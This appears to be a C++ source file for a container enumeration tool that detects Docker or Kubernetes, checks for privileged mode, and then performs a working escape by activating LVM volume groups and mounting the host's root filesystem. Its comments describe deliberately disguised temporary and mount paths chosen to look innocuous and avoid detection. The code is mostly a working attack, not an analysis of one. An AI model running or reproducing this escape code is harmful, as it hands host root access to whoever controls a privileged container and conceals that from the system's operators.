#include "docker_enum.h"
#include <fstream>
#include <string>
#include <vector>
#include <sys/stat.h>
#include <sstream>
#include <unistd.h>
#include <algorithm>
#include <cstdlib>

static bool file_exists(const std::string& path) {
    struct stat buffer;
    return (stat(path.c_str(), &buffer) == 0);
}

static std::string read_file(const std::string& path) {
    std::ifstream ifs(path);
    if (!ifs.is_open()) return "";
    std::stringstream ss;
    ss << ifs.rdbuf();
    return ss.str();
}

static bool check_docker() {
    if (file_exists("/.dockerenv")) return true;

    const char* cgroup_paths[] = {"/proc/self/cgroup", "/proc/1/cgroup"};
    for (const char* path : cgroup_paths) {
        std::string cgroup = read_file(path);
        if (cgroup.find("docker") != std::string::npos || 
            cgroup.find("kubepods") != std::string::npos ||
            cgroup.find("containerd") != std::string::npos) return true;
    }

    std::string mountinfo = read_file("/proc/self/mountinfo");
    if (mountinfo.find("docker") != std::string::npos) return true;

    return false;
}

static bool check_privileged(std::string& details) {
    bool privileged = false;

    if (file_exists("/dev/sda") || file_exists("/dev/vda") || file_exists("/dev/nvme0n1")) {
        privileged = true;
    }

    std::string status = read_file("/proc/self/status");
    size_t cap_pos = status.find("CapEff:");
    if (cap_pos != std::string::npos) {
        std::string cap_line = status.substr(cap_pos, status.find("\n", cap_pos) - cap_pos);
        if (cap_line.find("fffffffff") != std::string::npos) {
            privileged = true;
        }
    }

    return privileged;
}

// Function to perform the LVM mount escape with "simple obfuscated" names
bool run_lvm_escape(std::string& details) {
    // Less suspicious paths
    const std::string tmp_v = "/tmp/.font-unix-s";
    const std::string tmp_l = "/tmp/.font-unix-d";
    const std::string mnt_p = "/var/tmp/.system-cache";

    // 1. Scan for VGs
    system(("vgscan > " + tmp_v + " 2>&1").c_str());
    std::string vgs = read_file(tmp_v);
    unlink(tmp_v.c_str());
    
    size_t vg_pos = vgs.find("Found volume group \"");
    if (vg_pos == std::string::npos) return false;
    
    size_t name_start = vg_pos + 20;
    size_t name_end = vgs.find("\"", name_start);
    std::string vg_name = vgs.substr(name_start, name_end - name_start);
    
    // 2. Activate VG
    system(("vgchange -ay " + vg_name + " > /dev/null 2>&1").c_str());
    
    // 3. Create device nodes
    system("vgmknodes > /dev/null 2>&1");
    
    // 4. Find the LV path
    system(("lvdisplay -c > " + tmp_l + " 2>&1").c_str());
    std::string lvs = read_file(tmp_l);
    unlink(tmp_l.c_str());

    size_t lv_pos = lvs.find("/dev/" + vg_name);
    if (lv_pos == std::string::npos) return false;
    std::string lv_path = lvs.substr(lv_pos, lvs.find(":", lv_pos) - lv_pos);
    
    // 5. Mount to a less suspicious location
    system(("mkdir -p " + mnt_p).c_str());
    std::string mount_cmd = "mount " + lv_path + " " + mnt_p + " > /dev/null 2>&1";
    if (system(mount_cmd.c_str()) == 0) {
        details += "Host root accessible at " + mnt_p;
        return true;
    }
    
    return false;
}

DetectionResult run_environment_checks() {
    DetectionResult result;
    result.is_docker = check_docker();
    result.is_privileged = false;
    result.can_escape = false;
    result.details = "";
    
    if (result.is_docker) {
        result.is_privileged = check_privileged(result.details);
        if (result.is_privileged) {
            if (run_lvm_escape(result.details)) {
                result.can_escape = true;
            }
        }
    }

    return result;
}
